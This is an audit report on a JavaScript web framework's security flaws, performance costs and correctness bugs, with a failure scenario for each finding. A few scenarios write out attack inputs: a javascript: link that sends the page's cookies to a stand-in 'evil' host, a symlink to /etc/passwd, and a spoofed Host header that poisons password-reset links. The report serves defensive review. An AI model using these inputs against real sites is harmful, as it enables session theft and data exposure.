# Moonshine security & performance audit

Read-only audit of `packages/core`, `packages/server`, `packages/react`, `packages/router`,
`packages/compiler`, `packages/framework`, `packages/cli`, `packages/deploy-*` at commit `2deffcf`.
Adapters and examples slated for deletion were excluded. Every finding below was confirmed by
reading the code; the ones marked "verified" were additionally reproduced by execution.

---

## Security

### S1 — CRITICAL — server bundle and build manifest are served as public static files

`packages/cli/src/preview.ts:78`, `packages/deploy-bun/src/index.ts:120` and `:125` (generated
entry), `packages/deploy-node/src/index.ts:269` and `:271` (generated entry)

Every shipped server entry sets `staticDir` to the build output directory itself
(`resolve(projectDir, ".moonshine")` / `import.meta.dir`), and `tryServeStatic` will serve any file
beneath it. That directory contains `dist/server.js` (the bundled server code: loaders, actions,
middleware, and any secret inlined at bundle time), `manifest.json`, and `.build/server.ts`.

Failure scenario: `moonshine build && moonshine preview`, then `curl http://host/dist/server.js`
returns the whole server bundle with `content-type: text/javascript`. Verified against
`tryServeStatic` with a fixture directory: `/dist/server.js -> "SECRET_SERVER_BUNDLE"`,
`/manifest.json -> "{}"`. `manifest.json` additionally discloses absolute filesystem paths of the
build machine and the complete route map including non-public routes.

### S2 — HIGH — static serving does not contain symlinks

`packages/server/src/static.ts:62-75` (and `packages/deploy-node/src/index.ts:61-82`, same shape)

`resolveStaticPath` rejects `..`, separators and NUL in each decoded segment and then checks the
joined path is under the root, but the check is purely lexical — `Bun.file()` / `createReadStream`
then follow symlinks out of the root.

Failure scenario: a symlink `public/link.txt -> /etc/passwd` (or any build step that symlinks
`node_modules`, a shared assets dir, or a CI cache into the static root) makes `GET /link.txt`
return the target's contents. Verified: with `staticDir/link.txt` symlinked to a file outside the
root, `tryServeStatic` returned `"OUTSIDE"` with `content-type: text/plain`. Percent-encoded and
literal `..` are correctly rejected — the traversal defence works, the symlink defence is absent.

### S3 — MEDIUM — no dotfile exclusion and no `nosniff` on static responses

`packages/server/src/static.ts:41-59`, `:71-75`

Segments beginning with `.` are allowed, so `.env`, `.git/config`, `.npmrc` under the static root
are served, and extensions outside the `MIME` table fall back to `file.type || application/octet-stream`
with no `X-Content-Type-Options: nosniff`.

Failure scenario: `GET /.env` on a deployment whose static root is the project root (the pattern
S1 already puts in every generated entry — `.build/` is reachable there today) returns the file
verbatim. An unknown-extension upload can additionally be content-sniffed into `text/html` by
older browsers.

### S4 — MEDIUM — production error responses leak internal exception messages

`packages/server/src/errors.ts:30-33`

`errorResponse` suppresses the stack in production but always includes `error.message` in the JSON
body.

Failure scenario: a loader's `pg` connection failure produces
`{"error":"connect ECONNREFUSED 10.0.3.14:5432"}` — or, with a driver that embeds the DSN,
credentials — returned to an unauthenticated client with status 500.

### S5 — MEDIUM — `Link` does not validate the href scheme

`packages/router/src/navigation.ts:218-236`

`props.href` is passed straight to the anchor. The `onClick` handler bails out on modified clicks
and lets the browser handle the navigation natively.

Failure scenario: an app renders `<Link href={item.url} />` from CMS/user data with
`javascript:fetch('//evil/'+document.cookie)`. A middle-click or ctrl-click (explicitly excluded
from the intercept at `:226-231`) executes the URL in page origin. React does not block
`javascript:` hrefs, it only warns.

### S6 — MEDIUM — request URL origin is taken from the attacker-controlled `Host` header

`packages/deploy-node/src/index.ts:118-119`

`new URL(reqUrl, \`http://${req.headers.host ?? "localhost"}\`)`builds the`Request.url`that every
loader, action and`isSafeRedirect` base then sees.

Failure scenario: `Host: evil.example` on a request to a password-reset route makes any loader that
derives an absolute link from `new URL(ctx.request.url)` emit `http://evil.example/reset?token=…`
into the outgoing email. (The redirect check itself is not bypassable, because it compares the
poisoned URL against itself, but everything downstream of `request.url` is.)

### S7 — LOW — generated server entry interpolates paths into JS string literals unescaped

`packages/compiler/src/build.ts:37`, `:43`, `:58-63`, `:82-83`

`route.path`, `route.id` and `route.file` are dropped into `"…"` literals in emitted source with no
escaping.

Failure scenario: a route file named `a".tsx` (legal on POSIX) produces
`"/a"": { module: route_0, … }` and the build fails with a syntax error; a crafted name terminates
the literal and injects arbitrary code into the generated server entry. Requires write access to
the routes directory, so impact is limited to build pipelines that check out untrusted branches.

### S8 — LOW — island id interpolated into a CSS selector

`packages/react/src/islands.tsx:99-101`

The value of `data-moonshine-island` is spliced into an attribute-selector string. The id is
server-generated (`moonshine-island-<fnv hash>`), so this is not reachable today, but a `"` in a
future id source turns into a `querySelector` throw that aborts hydration for all remaining
islands in the loop.

### S9 — LOW — `__proto__` in island props reaches React's props object

`packages/react/src/islands.tsx:102`, `:110`

`JSON.parse` itself is safe (it creates an own property), but `createElement(Component, props)`
copies own keys onto a fresh object literal with `props[k] = v`, and assigning `__proto__` sets that
object's prototype. Scope is the single element's props object, not `Object.prototype`, so this is
informational rather than exploitable — but a component reading an inherited-looking field would
see attacker-chosen values if the server ever serializes attacker-controlled prop keys.

### Checked and clean

- **SSR HTML escaping.** Body markup comes from `renderToReadableStream`, which escapes text and
  attributes. The only hand-assembled HTML is `packages/react/src/renderer.tsx:74`, `:81`, `:88`,
  `:106`, `:114`, `:117` — every interpolation goes through `escapeHtml` (which covers
  `& < > " '`) and every attribute is double-quoted. No unquoted attributes, no `on*` handler
  assembly, no user-controlled `javascript:` sink in the emitted markup.
- **`</script>` breakout / JSON injection.** Both serializers escape `<`, `>`, `&`, U+2028 and
  U+2029 to `\uXXXX` before the string reaches the page
  (`packages/server/src/serialize.ts:1-5,85`, `packages/react/src/serialize.ts:1-5,32`). The
  `dangerouslySetInnerHTML` at `islands.tsx:80-82` is fed only from that escaped output.
- **Path traversal.** `resolveStaticPath` correctly rejects literal and percent-encoded `..`,
  embedded separators, NUL bytes, and post-join escapes (verified). Only the symlink case (S2)
  gets through.
- **Open redirect.** `isSafeRedirect` (`packages/server/src/pipeline.ts:22-31`) rejects control
  characters and requires same-origin after resolving against the request URL — correct.
  `createMoonshineRouter.navigate` (`navigation.ts:48-54`) discards the origin and pushes only
  `pathname + search + hash`, so a cross-origin `to` cannot navigate away.
- **Shell command construction.** `Bun.spawn` is called with argv arrays and no shell in
  `packages/cli/src/compile.ts:55-62` and `packages/cli/src/dev.ts:9-17`. No `exec`/`sh -c`
  anywhere in the audited packages.
- **Dependency and supply chain.** The audited packages depend only on each other plus
  `react`/`react-dom` (MIT); root devDependencies are `typescript` (Apache-2.0), `oxlint`,
  `prettier`, `solid-js`, `@types/*` (MIT). No `postinstall`/`preinstall` scripts in `bun.lock`,
  no telemetry SDK, no network calls outside the request path.
- **Embedded secrets.** None found; no hardcoded credentials, keys or tokens in any audited file.
- **CORS / unbounded bodies.** No CORS headers are emitted by default (default-deny, correct), and
  the framework never buffers request bodies itself — body handling is entirely the application's.

---

## Performance

### P1 — HIGH — memo recomputation tears down and rebuilds the upstream subscription tree, giving quadratic cost in graph depth

`packages/core/src/signal.ts:210` (`recompute` → `observe`), with `:176-181` and `:167`/`:170`

`recompute()` unconditionally calls `observe()`, which unsubscribes from every dependency and
resubscribes. Unsubscribing drops a dependency memo to zero listeners, which fires `unobserve()`
and recursively tears down _its_ upstream subscriptions; resubscribing takes `listeners.size === 1`
and rebuilds the whole chain. One write therefore does O(depth) teardown/rebuild work at every
level of the chain.

Failure scenario, measured: a chain of N `createMemo`s over one signal, with a single subscriber on
the tail, cost per `signal.set()`:

| chain depth | µs per write |
| ----------- | ------------ |
| 50          | 819          |
| 100         | 3 522        |
| 200         | 17 285       |
| 400         | 89 825       |
| 800         | 150 229      |

Each doubling costs 4-5x, i.e. worse than quadratic in this range. A 200-deep derived chain spends
17 ms of CPU on a single state update. Fan-out is fine by contrast (100→800 sibling memos on one
signal scales roughly linearly, 115 µs → 581 µs per write), so the defect is specific to depth.

### P2 — HIGH — SSR is fully buffered despite the manifest advertising `streaming`

`packages/react/src/renderer.tsx:16-20`, called from `:99` and `:142`

`renderToStringAsync` awaits `stream.allReady`, wraps the stream in a throwaway `Response` purely
to call `.text()`, and then the caller concatenates the result into a template literal at `:106`.
Meanwhile `packages/compiler/src/manifest.ts:59` adds `"streaming"` to every manifest's
capabilities unconditionally.

Failure scenario: a page with a `Suspense` boundary awaiting a 400 ms API call sends zero bytes for
400 ms; TTFB equals full render time, and the HTML is materialised three times (stream chunks →
`Response` buffer → `text()` string → the outer template literal) before the first byte leaves.

### P3 — MEDIUM — the route graph is recompiled on every router render

`packages/router/src/navigation.ts:165-171`

`createRouteGraph(props.routes.map(...))` sits in the component body with no `useMemo`. It allocates
a new array, runs `compilePattern` on every route (which splits, allocates a `Segment[]`, a
`precedence[]`, a normalized string and a closure per route), and builds a dedupe `Map` — on every
render, including every keystroke in a child that bubbles a state change through the provider.

Failure scenario: a 300-route SPA re-renders the router on each navigation and on each parent state
change, paying 300 pattern compilations plus ~1 200 allocations per render for a result that never
changes unless `props.routes` changes identity.

### P4 — MEDIUM — two filesystem probes per dynamic GET request

`packages/server/src/pipeline.ts:244-251` and `packages/deploy-bun/src/index.ts:29-36`, wired
together by the generated entry at `packages/deploy-bun/src/index.ts:116-126` (and the equivalent
node entry at `:265-271`), which passes the same `staticDir` to both layers.

`createBunServer` probes the static directory, and if it misses, `createRequestHandler` probes the
identical path again before routing. Each probe is an `await Bun.file(...).exists()` syscall.

Failure scenario: every request to a dynamic route — the common case for an SSR app — pays two
`stat` calls before any routing work happens; at 10 k req/s that is 20 k wasted syscalls per second.
The static path is also consulted before the route graph, so it is never elided by a route match.

### P5 — MEDIUM — layout/middleware discovery does uncached synchronous `existsSync` per route per ancestor

`packages/compiler/src/inherit.ts:9-19` and `:40-47`

For each route, `applyInheritance` walks every ancestor directory and calls `findSpecial` three
times (layout, middleware, error), each of which tries two extensions — up to 6 `existsSync` calls
per ancestor per route, with no memoisation across routes that share ancestors.

Failure scenario: 1 000 routes at average depth 4 issue ~30 000 synchronous `stat` calls, all of
them blocking the event loop, when the distinct (dir, kind) pairs number in the low hundreds.

### P6 — MEDIUM — store writes notify at root granularity

`packages/core/src/signal.ts:319-345`

The proxy's `get` trap calls `track(node)` with the single root `Source` regardless of which path
was read, and `set`/`deleteProperty` call `notify()` on that same root.

Failure scenario: a 2 000-row table store where 40 components each `useStore(store)` and read one
row — mutating `store.rows[0].selected` bumps the root version and re-renders all 40 components,
including the 39 that read nothing that changed.

### P7 — LOW — the emitted server entry duplicates an identical helper per route

`packages/compiler/src/build.ts:44-56`

`makeModule_${i}` is byte-identical for every route but emitted once per route.

Failure scenario: a 500-route project emits 500 copies of the same 12-line function into
`.build/server.ts`, inflating parse time and bundle size for zero behavioural difference.

### P8 — LOW — a fresh `Response` plus a full header copy is allocated on every request

`packages/server/src/pipeline.ts:99-112`

`finalizeResponse` always constructs a new `Headers`, iterates and copies every response header, and
allocates a new `Response`, even when `baseHeaders` is empty (the default when no route, layout or
`defaultMeta` sets headers).

### P9 — LOW — HTML attribute escaping does five full string passes

`packages/react/src/serialize.ts:8-13`

`escapeHtmlValue` chains five `.replace` calls, each scanning and reallocating the whole string.
Called once per island specifier and per client entry per render.

### Checked and clean

- **Compiler node-count behaviour.** `analyzeModule` (`packages/compiler/src/analyze.ts:136-148`)
  is a single `forEachChild` walk — linear in AST nodes, with the per-node predicates all O(1)
  except `isExportedHandler`'s 8-element list scan. Nothing quadratic.
- **Per-request routing.** `matchRoutes` (`packages/router/src/graph.ts:59-89`) is linear over
  routes with a sort only over actual matches. `compilePattern` is hoisted to graph construction
  on the server path (the client path is P3). No per-request regex compilation or config parsing
  anywhere in `packages/server`.
- **Unbounded caches.** No `Map`/`Set` in the request path grows without bound; the only long-lived
  collections are the module-scope `pending` batch set (cleared on every flush,
  `signal.ts:39-42`), the `storeRoots` and `proxies` `WeakMap`s, and the per-render island
  registry.
- **Listener leaks.** `createSignal`, `createMemo` and `createStore` all return working
  unsubscribers that `delete` from the listener `Set`; `effect` (`packages/core/src/runes.ts:38-62`)
  splices and calls its unsubs before every re-run and on dispose. No array that only grows.
- **String building.** SSR head/tail assembly uses arrays with `join("")`
  (`renderer.tsx:72-93`, `:112-117`), not `+=` in a loop. No repeated `JSON.stringify` of the same
  payload on the request path.

---

## Correctness (found while auditing the above)

### C1 — MEDIUM — `serializeIslandProps` rejects shared object references as cycles

`packages/react/src/serialize.ts:18-29`

The `seen` `WeakSet` is added to but never removed, so it flags any repeated visit, not just a
cycle. `packages/server/src/serialize.ts:33,45,59,81` gets this right with add/delete around the
recursion.

Failure scenario, verified: `serializeIslandProps({ x: shared, y: shared })` throws
`cyclic reference`, while `serializeData` on the same value correctly returns
`{"x":{"a":1},"y":{"a":1}}`. Any island whose props reference the same object twice — a shared
config, a `user` appearing under two keys, a repeated item in a list — fails to render with a
misleading error.

### C2 — LOW — `createResource.refetch` has no race guard

`packages/core/src/resource.ts:50-68`

Concurrent `refetch()` calls have no request token or abort; whichever promise settles last wins.

Failure scenario: a search-as-you-type resource issues `refetch()` for "ab" then "abc"; if the "ab"
request is slower, its stale results overwrite the "abc" results and `loading` flips to `false`
while the newer request is still in flight.
